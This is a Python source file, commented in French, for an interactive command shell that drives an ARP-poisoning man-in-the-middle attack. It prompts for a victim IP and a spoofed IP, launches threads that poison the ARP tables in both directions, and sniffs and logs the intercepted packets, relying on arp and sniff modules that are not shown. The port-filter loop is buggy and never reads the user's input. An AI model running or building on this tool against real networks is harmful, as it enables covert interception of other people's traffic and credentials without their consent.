"""
But    --> Créer le shell pour l'arp poisoning
Auteur --> Aiglematth
"""
#ZONE D'IMPORT
from cmd import Cmd
from colorama import Fore, Style
from sys import exit
from shlex import split
import sniff
import arp
##############
#CLASSE SHELL
class shell(Cmd):
    """
    Classe qui servira de shell pour l'arp poisoning
    """
    def __init__(self):
        Cmd.__init__(self)
        ##############
        self.red = Fore.RED
        self.blue = Fore.BLUE
        self.yellow = Fore.YELLOW
        self.resetAll = Style.RESET_ALL
        ##############
        self.intro = self.blue + "CMD SHELL FOR ARP POISONING" + self.resetAll
        self.prompt = self.red + "ArPoison >> " + self.resetAll
        ##############
        self.arp = arp.ArpPoison()
        self.sniffer = sniff.Sniff()

    def do_exit(self, arg):
        "Quitter le shell"
        exit()

    def do_goArpPoison(self, arg):
        "Lance l'attaque"
        ############################################################################################################
        victime = input(self.yellow + "IP de la victime >> " + self.resetAll)
        usurpe = input(self.yellow + "IP de l'usurpant >> " + self.resetAll)
        timeout = int(input(self.yellow + "Timeout (en secondes) >> " + self.resetAll))
        discretion = int(input(self.yellow + "Discretion (entre 1 et 100) >> " + self.resetAll))
        typeOfPacket = split(input(self.yellow + "Types de protocoles sniffées \n(Tapez sur la touche entrer si vous voulez tout sniffer) >> " + self.resetAll))
        if len(typeOfPacket) == 0:
            typeOfPacket = None
        portst = split(input(self.yellow + "Ports sniffées, destination et source \n(Tapez sur la touche entrer si vous voulez tout sniffer) >> " + self.resetAll))
        ports = []
        for port in ports:
            try:
                p = int(port)
                ports.append(p)
            except:
                pass
        if len(ports) == 0:
            ports = None
        fileTo = input(self.yellow + "Fichier log ou enregistrer le résultat \n(Tapez sur la touche entrer si ne voulez pas les enregistrer) >> " + self.resetAll)
        if fileTo == "":
            fileTo = None
        if fileTo != None:
            summary = input(self.yellow + "Paquets résumées (oui/non) >> " + self.resetAll)
            if summary.upper() == "OUI":
                summary = True
            else:
                summary = False
        else:
            summary = False
        ############################################################################################################
        print(self.blue + "Début de l'attaque...pressez Ctrl + c si vous voulez la stopper avant la fin de son éxecution" + self.resetAll)

        self.arp = arp.ArpPoison(timeout=timeout, discretion=discretion)

        arpVersVictime = arp.ThreadEnvoi(self.arp, victime, usurpe)
        arpVersUsurpe = arp.ThreadEnvoi(self.arp, usurpe, victime)
        sniffing = sniff.ThreadSniff(self.sniffer, typeOfPacket=typeOfPacket, src=(victime, usurpe), dst=(victime, usurpe), port=ports, time_out=timeout, counter=0, fileTo=fileTo, summary=summary)

        arpVersVictime.start()
        arpVersUsurpe.start()
        sniffing.start()

        arpVersVictime.join()
        arpVersUsurpe.join()
        sniffing.join()

        print(self.blue + "Fin de l'attaque..." + self.resetAll)

    def do_show(self, arg):
        "Montre les paquets, prends (oui/non) pour une demande de liste d'ips et (oui/non) pour une demande de liste de protos"
        arg = split(arg)
        if len(arg) > 0 and len(arg) < 3:
            if arg[0].upper() == "OUI" and arg[1].upper() == "OUI":
                ips = split(input(self.yellow + "IPS à montrer >> " + self.resetAll))
                protos = split(input(self.yellow + "PROTOS à montrer >> " + self.resetAll))
                self.sniffer.showSpecialIpsAndTypes(ips, protos)
            elif arg[0].upper() == "OUI" and arg[1].upper() == "NON":
                ips = split(input(self.yellow + "IPS à montrer >> " + self.resetAll))
                self.sniffer.showSpecialIps(ips)
            elif arg[0].upper() == "NON" and arg[1].upper() == "OUI":
                protos = split(input(self.yellow + "PROTOS à montrer >> " + self.resetAll))
                self.sniffer.showSpecialTypes(protos)
            else:
                print("Problème...veuillez vérifier votre commande...")
        else:
            self.sniffer.showAll()

    def do_load(self, arg):
        "Enregistre les paquets, prends un nom de fichier, si les paquets sont résumés (oui/non), (oui/non) pour une demande de liste d'ips et (oui/non) pour une demande de liste de protos"
        arg = split(arg)
        sum = True

        try:
            if arg[1].upper() == "OUI":
                sum = True
            else:
                sum = False
        except:
            pass

        if len(arg) > 2:
            if arg[2].upper() == "OUI" and arg[3].upper() == "OUI":
                ips = split(input(self.yellow + "IPS à montrer >> " + self.resetAll))
                protos = split(input(self.yellow + "PROTOS à montrer >> " + self.resetAll))
                self.sniffer.enregistrerAvecOptions(arg[0], summary=sum, types=protos, ips=ips)
            elif arg[2].upper() == "OUI" and arg[3].upper() == "NON":
                ips = split(input(self.yellow + "IPS à montrer >> " + self.resetAll))
                self.sniffer.enregistrerIps(arg[0], summary=sum, ips=ips)
            elif arg[2].upper() == "NON" and arg[3].upper() == "OUI":
                protos = split(input(self.yellow + "PROTOS à montrer >> " + self.resetAll))
                self.sniffer.enregistrerTypes(arg[0], summary=sum, types=protos)
            else:
                print("Problème...veuillez vérifier votre commande...")
        elif len(arg) == 1:
            self.sniffer.enregistrerSelf(arg[0], sum)
        else:
            print("Il manque des arguments...consultez l'aide si vous êtes perdus")

    def do_clear(self, arg):
        "Permet de vider la liste de résultats"
        self.sniffer.clear()
        print(self.red + "Liste vidée..." + self.resetAll)

    def do_nbrPacket(self, arg):
        "Permet de connaître le nombre de paquets contenues dans la liste de paquets sniffés"
        print(self.red + "Nombre de paquets sniffés : {}".format(len(self.sniffer.resultat)) + self.resetAll)


if __name__ == "__main__":
    s = shell()
    s.cmdloop()
